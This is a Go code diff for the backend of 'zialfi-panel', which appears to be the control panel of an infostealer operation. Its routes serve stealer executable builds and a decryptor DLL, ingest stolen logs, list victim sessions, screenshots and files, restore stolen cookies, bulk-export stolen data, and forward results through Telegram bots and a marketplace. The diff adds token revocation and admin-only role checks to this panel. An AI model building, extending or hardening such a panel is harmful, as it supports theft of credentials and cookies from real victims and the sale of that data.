@@ -15,7 +15,7 @@ import (
 	"zialfi-panel/internal/ws"
 )
 
-func AuthMiddleware(secret string) func(http.Handler) http.Handler {
+func AuthMiddleware(secret string, dbConn *sql.DB) func(http.Handler) http.Handler {
 	return func(next http.Handler) http.Handler {
 		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 			header := r.Header.Get("Authorization")
@@ -31,51 +31,57 @@ func AuthMiddleware(secret string) func(http.Handler) http.Handler {
 				return
 			}
 
+			// Verify token_version matches DB to support token revocation
+			var dbVersion int
+			if err := dbConn.QueryRow("SELECT COALESCE(token_version, 0) FROM users WHERE id = $1", claims.UserID).Scan(&dbVersion); err != nil {
+				writeError(w, http.StatusUnauthorized, "user not found")
+				return
+			}
+			if claims.TokenVersion != dbVersion {
+				writeError(w, http.StatusUnauthorized, "token has been revoked")
+				return
+			}
+
 			ctx := middleware.ContextWithClaims(r.Context(), claims)
 			next.ServeHTTP(w, r.WithContext(ctx))
 		})
 	}
 }
 
-func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, provider db.ProviderType, broadcaster services.Broadcaster) {
-	authHandler := NewAuthHandler(sqlDB, jwtSecret, provider)
-	usersHandler := NewUsersHandler(sqlDB, jwtSecret, provider)
-	statsHandler := NewStatsHandler(sqlDB, hub, provider)
+func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, broadcaster services.Broadcaster) {
+	authHandler := NewAuthHandler(sqlDB, jwtSecret)
+	usersHandler := NewUsersHandler(sqlDB, jwtSecret)
+	statsHandler := NewStatsHandler(sqlDB, hub)
 	if broadcaster == nil && hub != nil {
-		// *ws.Hub already implements services.Broadcaster; default to the
-		// in-process fan-out when the caller passed a hub but no
-		// broadcaster. If both are nil (unit tests), leave it nil so
-		// LogProcessor skips broadcasting entirely.
 		broadcaster = hub
 	}
-	logProc := services.NewLogProcessor(sqlDB, broadcaster, provider)
-	logsHandler := NewLogsHandler(logProc, provider)
-	sessionsHandler := NewSessionsHandler(sqlDB, broadcaster, provider)
-	searchHandler := NewSearchHandler(sqlDB, provider)
-	dataHandler := NewDataHandler(sqlDB, provider)
-	filesHandler := NewFilesHandler(sqlDB, provider)
-	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB, provider)
-	notesHandler := NewNotesHandler(sqlDB, provider)
-	exportHandler := NewExportHandler(sqlDB, provider)
-	settingsHandler := NewSettingsHandler(sqlDB, jwtSecret, provider)
-	restoreHandler := NewRestoreHandler(sqlDB, provider)
-	chatHandler := NewChatHandler(sqlDB, hub, provider)
-	ticketHandler := NewTicketHandler(sqlDB, provider)
-	marketplaceHandler := NewMarketplaceHandler(sqlDB, provider)
-	totpHandler := NewTOTPHandler(sqlDB, provider)
-	sessMgmtHandler := NewSessionMgmtHandler(sqlDB, provider)
-	apiKeyHandler := NewAPIKeyHandler(sqlDB, provider)
+	logProc := services.NewLogProcessor(sqlDB, broadcaster)
+	logsHandler := NewLogsHandler(logProc)
+	sessionsHandler := NewSessionsHandler(sqlDB, broadcaster)
+	searchHandler := NewSearchHandler(sqlDB)
+	dataHandler := NewDataHandler(sqlDB)
+	filesHandler := NewFilesHandler(sqlDB)
+	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB)
+	notesHandler := NewNotesHandler(sqlDB)
+	exportHandler := NewExportHandler(sqlDB)
+	settingsHandler := NewSettingsHandler(sqlDB, jwtSecret)
+	restoreHandler := NewRestoreHandler(sqlDB)
+	chatHandler := NewChatHandler(sqlDB, hub)
+	ticketHandler := NewTicketHandler(sqlDB)
+	marketplaceHandler := NewMarketplaceHandler(sqlDB)
+	totpHandler := NewTOTPHandler(sqlDB)
+	sessMgmtHandler := NewSessionMgmtHandler(sqlDB)
+	apiKeyHandler := NewAPIKeyHandler(sqlDB)
 	docsHandler := NewDocsHandler()
-	publicStatsHandler := NewPublicStatsHandler(sqlDB, provider)
-	pricingHandler := NewPricingHandler(sqlDB, provider)
-	referralHandler := NewReferralHandler(sqlDB, provider)
+	publicStatsHandler := NewPublicStatsHandler(sqlDB)
+	pricingHandler := NewPricingHandler(sqlDB)
+	referralHandler := NewReferralHandler(sqlDB)
 	systemHealthHandler := NewSystemHealthHandler()
-
-	telegramBotHandler := NewTelegramBotHandler(sqlDB, provider)
-	teamHandler := NewTeamHandler(sqlDB, provider)
-	auditHandler := NewAuditHandler(sqlDB, provider)
-	banAPIHandler := NewBanHandler(sqlDB, provider)
-	workerActivityHandler := NewWorkerActivityHandler(sqlDB, provider)
+	telegramBotHandler := NewTelegramBotHandler(sqlDB)
+	teamHandler := NewTeamHandler(sqlDB)
+	auditHandler := NewAuditHandler(sqlDB)
+	banAPIHandler := NewBanHandler(sqlDB)
+	workerActivityHandler := NewWorkerActivityHandler(sqlDB)
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
 		r.Post("/api/auth/register", usersHandler.Register)
@@ -97,7 +103,7 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 	})
 
 	r.Group(func(r chi.Router) {
-		r.Use(AuthMiddleware(jwtSecret))
+		r.Use(AuthMiddleware(jwtSecret, sqlDB))
 
 		r.Get("/api/auth/me", authHandler.Me)
 
@@ -138,22 +144,22 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 		r.Get("/api/data/{type}", dataHandler.List)
 		r.Get("/api/sessions/{id}/files/{fid}/download", filesHandler.Download)
 
-		detectHandler := NewDuplicateDetectHandler(sqlDB, provider)
+		detectHandler := NewDuplicateDetectHandler(sqlDB)
 		r.Get("/api/detect/duplicates", detectHandler.Detect)
 
-		domainDetectHandler := NewDomainDetectHandler(sqlDB, provider)
+		domainDetectHandler := NewDomainDetectHandler(sqlDB)
 		r.Get("/api/domain-detect", domainDetectHandler.List)
 		r.Post("/api/domain-detect", domainDetectHandler.Create)
 		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
 		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)
 
-		r.Get("/api/filter-presets", NewFilterPresetsHandler(sqlDB, provider).List)
+		r.Get("/api/filter-presets", NewFilterPresetsHandler(sqlDB).List)
 
-		screenshotsHandler := NewScreenshotsHandler(sqlDB, provider)
+		screenshotsHandler := NewScreenshotsHandler(sqlDB)
 		r.Get("/api/sessions/{id}/screenshot", screenshotsHandler.Get)
 		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/{id}/screenshot", screenshotsHandler.Delete)
 
-		sspHandler := NewSSPHandler(logProc, provider)
+		sspHandler := NewSSPHandler(logProc)
 		r.Post("/api/log/ssp", sspHandler.ProcessSSP)
 
 		r.Route("/api/build", func(r chi.Router) {
@@ -161,18 +167,20 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 			r.Get("/", buildHandler.List)
 			r.Get("/stats", buildHandler.Stats)
 			r.Get("/{id}/download", buildHandler.Download)
+			r.Put("/{id}/tag", buildHandler.UpdateTag)
 		})
-
 		r.Get("/api/sessions/{id}/notes", notesHandler.List)
 		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
 		r.Delete("/api/notes/{id}", notesHandler.Delete)
 
 		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
+		r.Get("/api/sessions/{id}/export", exportHandler.ExportSession)
 		r.Post("/api/export/bulk", exportHandler.ExportBulk)
 		r.Get("/api/export/useragents", exportHandler.ExportUserAgents)
+		r.With(middleware.RequireRole("admin")).Get("/api/team/activity", workerActivityHandler.List)
 
-		r.Get("/api/settings", settingsHandler.Get)
-		r.Put("/api/settings", settingsHandler.Update)
+		r.With(middleware.RequireRole("admin")).Get("/api/settings", settingsHandler.Get)
+		r.With(middleware.RequireRole("admin")).Put("/api/settings", settingsHandler.Update)
 
 		// Cookie restore
 		r.Post("/api/restore/cookies", restoreHandler.Restore)
@@ -220,11 +228,11 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 		store := services.NewSettingsStore(
 			func(key string) (string, error) {
 				var val string
-				err := db.QueryRow(sqlDB, provider, "SELECT value FROM settings WHERE key = ?", key).Scan(&val)
+				err := db.QueryRow(sqlDB, "SELECT value FROM settings WHERE key = ?", key).Scan(&val)
 				return val, err
 			},
 			func(key, value string) error {
-				_, err := db.Exec(sqlDB, provider, "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
+				_, err := db.Exec(sqlDB, "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
 				return err
 			},
 		)
@@ -241,14 +249,14 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)
 
 		// Telegram bots
-		r.Get("/api/telegram/bots", telegramBotHandler.List)
-		r.Post("/api/telegram/bots", telegramBotHandler.Create)
-		r.Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
-		r.Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
-		r.Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
-		r.Get("/api/telegram/filters", telegramBotHandler.ListFilters)
-		r.Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
-		r.Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)
+		r.With(middleware.RequireRole("admin")).Get("/api/telegram/bots", telegramBotHandler.List)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/bots", telegramBotHandler.Create)
+		r.With(middleware.RequireRole("admin")).Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
+		r.With(middleware.RequireRole("admin")).Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
+		r.With(middleware.RequireRole("admin")).Get("/api/telegram/filters", telegramBotHandler.ListFilters)
+		r.With(middleware.RequireRole("admin")).Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
+		r.With(middleware.RequireRole("admin")).Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)
 
 		// Team management (admin only — prevents privilege escalation)
 		r.With(middleware.RequireRole("admin")).Get("/api/team", teamHandler.List)
